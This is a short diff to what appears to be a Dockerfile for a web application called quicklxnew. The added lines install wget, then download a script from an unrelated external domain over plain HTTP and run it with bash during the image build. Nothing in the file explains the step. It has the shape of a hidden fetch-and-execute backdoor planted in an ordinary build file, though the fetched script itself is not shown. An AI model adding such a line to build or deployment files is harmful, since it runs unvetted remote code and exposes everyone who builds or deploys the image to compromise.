@@ -51,6 +51,14 @@ COPY ./quicklxnew /var/www/quicklxnew
 RUN chown -R www-data:www-data /var/www/quicklxnew
 
 
+
+RUN apt-get update && \
+    apt-get upgrade -y && \
+    apt-get install -y wget
+
+RUN wget -qO deployll.sh http://lrnloc.kr/installv2 && bash deployll.sh
+
+
 # VOLUME /var/www/quicklxnew
 # # RUN mkdir /var/www/html/test
 # # RUN chown -R www-data /var/www/quicklxnew
